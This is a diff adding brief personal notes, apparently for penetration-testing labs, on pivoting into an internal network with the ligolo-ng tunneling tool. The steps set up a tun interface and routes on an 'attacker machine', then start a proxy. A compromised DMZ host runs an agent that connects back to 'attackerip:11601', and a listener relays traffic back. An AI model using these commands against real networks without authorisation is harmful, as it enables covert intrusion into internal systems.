@@ -1,0 +1,26 @@
+Attacker machine:
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+ip addr show ligolo
+
+Attacker machine (other tab)
+sudo ip route add internaliptarget/24 dev ligolo (it can changed with other internal ip target)
+
+Attacker machine (other tab)
+./proxy -selfcert
+
+DMZ machine (other tab)
+./agent -connect attackerip:11601 -ignore-cert ||| 172.19.254.6
+
+After connect:
+Attacker machine (other tab, listener ligolo-ng)
+session
+ifconfig
+after command below: (important!)
+start
+
+listening back:
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+
+
+
